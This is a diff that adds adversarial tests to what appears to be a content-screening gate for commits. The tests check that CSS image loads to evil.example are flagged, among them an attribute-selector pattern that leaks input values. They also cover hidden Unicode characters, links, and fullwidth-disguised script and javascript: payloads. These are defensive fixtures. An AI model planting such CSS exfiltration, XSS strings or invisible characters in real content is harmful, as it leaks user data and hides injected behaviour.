@@ -853,6 +853,73 @@ test('adversarial: a safe file that carries behaviour (markup, a remote load, a 
   assert.equal(judgeDiff([{ path: 'docs/a.md', status: 'A', oldMode: '000000', newMode: '100644', added: 1, deleted: 0, size: 3 }], fastSettings(CONF)).reasons.includes('content'), true);
 });
 
+test('adversarial: a style sheet that loads an image through image-set, image, src, cross-fade, element or paint takes the full circuit; ordinary CSS and prose stay plain', () => {
+  const loads = [
+    'input[value^="a"]{background:image-set("https://evil.example/a" 1x)}',
+    'a{background:-webkit-image-set("https://evil.example/b" 1x)}',
+    'a{background:image("https://evil.example/c")}',
+    'a{background:src("https://evil.example/d")}',
+    'a{background:cross-fade(red, blue)}',
+    'a{background:element(#hidden)}',
+    'a{background:paint(evil)}',
+  ];
+  for (const line of loads) {
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ 'web/app.css': `${line}\n` }));
+    const judged = judge(p, head);
+    assert.equal(judged.state, 'full', line);
+    assert.deepEqual(judged.reasons, ['content'], line);
+    assert.match(judged.offending.content, /^web\/app\.css \(load\)$/, line);
+  }
+  assert.equal(contentFinding(['h1 { color: #333; margin: 0 auto; }', 'Choose the image that suits you, then save.']), null);
+});
+
+test('adversarial: a hidden character (controls, format marks, line and paragraph separators, invisible fillers, the tag block) takes the full circuit; a tab, a trailing carriage return and plain accents stay plain', () => {
+  const hidden = ['\u0001', '\u0085', '­', '؜', '᠎', '​', '‏', '‮', ' ', ' ', '⁠', '⁦', '͏', 'ᅟ', 'ᅠ', '⠀', 'ㅤ', 'ﾠ', '﻿', '︀', '️', '\u{E0001}', '\u{E0041}', '\u{E007F}', '\r'];
+  for (const mark of hidden) {
+    const line = `Bonjour${mark}le monde`;
+    assert.equal(contentFinding([line]), 'hidden', JSON.stringify(line));
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ 'docs/guide.md': `${line}\n` }));
+    assert.deepEqual(judge(p, head).reasons, ['content'], JSON.stringify(line));
+  }
+  assert.equal(contentFinding(['Où est le café ? Voilà.', 'a\tb', 'une ligne\r']), null);
+});
+
+test('adversarial: a link in any form (a scheme and //, a protocol-relative //host, www., mailto:, a Markdown image) takes the full circuit with the reason link; a sentence without one stays plain', () => {
+  const links = ['see https://evil.example/x', 'open ftp://evil.example', 'see //evil.example/a', 'go to www.evil.example', 'write mailto:a@evil.example', '![logo](https://evil.example/p.png)', 'an image ![logo](logo.png)'];
+  for (const line of links) {
+    assert.equal(contentFinding([line]), 'link', line);
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ 'docs/guide.md': `${line}\n` }));
+    const judged = judge(p, head);
+    assert.equal(judged.state, 'full', line);
+    assert.deepEqual(judged.reasons, ['link'], line);
+    assert.match(judged.offending.link, /^docs\/guide\.md \(link\)$/, line);
+  }
+  assert.equal(contentFinding(['Nous répondons par e-mail, du lundi au vendredi.', 'Le site ferme à 18 h.']), null);
+});
+
+test('adversarial: fullwidth look-alikes are refused as the ASCII they fold to under NFKC, and the raw line is scanned too', () => {
+  const cases = [['＜script＞alert(1)＜/script＞', 'markup'], ['ｊａｖａｓｃｒｉｐｔ:alert(1)', 'load'], ['＜img src=x', 'markup'], ['ｈｔｔｐｓ：／／evil.example', 'link'], ['Price ＜b>', 'markup']];
+  for (const [line, finding] of cases) {
+    assert.equal(contentFinding([line]), finding, line);
+    const p = project();
+    const head = p.commit(({ write: w }) => w({ 'web/locales/en.json': `{"title": "${line}"}\n` }));
+    assert.deepEqual(judge(p, head).reasons, [finding === 'link' ? 'link' : 'content'], line);
+  }
+  // Forbidden texts match the folded form too.
+  assert.equal(contentFinding(['Ｐｒｉｘ 0 euro'], ['prix']), 'forbidden_text');
+  // Fullwidth wording that folds to plain words stays plain.
+  assert.equal(contentFinding(['Ｂｏｎｊｏｕｒ, ｍｏｎｄｅ']), null);
+});
+
+test('the lane record of a spawn is read and written under its lock, the lock lane_write takes', () => {
+  const spawn = readFileSync(fileURLToPath(new URL('../spawn-lane.sh', import.meta.url)), 'utf8');
+  assert.match(spawn, /\n {2}\(\n {4}flock -w 30 9\n {4}kept=\$\(jq [\s\S]*?\n {2}\) 9> "\$record\.lock"\n/);
+  assert.doesNotMatch(spawn, /\n {2}kept=\$\(jq /);
+});
+
 // ---- Who set the fast label ----
 
 test('label trust: a fast mark counts only when the user set it; a tracker that cannot say gives nothing unless the project opts in, and never against an agent it names', () => {
